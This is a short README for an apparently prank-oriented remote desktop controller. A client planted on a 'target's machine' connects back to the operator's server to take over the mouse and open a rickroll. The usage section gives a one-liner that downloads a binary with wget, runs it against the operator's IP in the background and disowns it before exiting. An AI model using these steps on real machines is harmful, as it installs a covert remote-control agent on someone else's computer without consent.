# remote-desktop-controller
We do a little trolling

# Building

Depends on x11 and the xtest extension.

```
make client server
```

# Usage

The server will run on your machine, and the client will run on the target's machine.

If you want to quickly download the client and run it on the target machine, a client binary is available in the bin folder. Before running the client, make sure the server is running on your machine.
```
wget https://github.com/longwatermelon/remote-desktop-control/raw/master/bin/client
chmod +x client
./client <your ip> &
disown
exit
```

* m: Toggle mouse control on/off
* y: Open rickroll in default browser


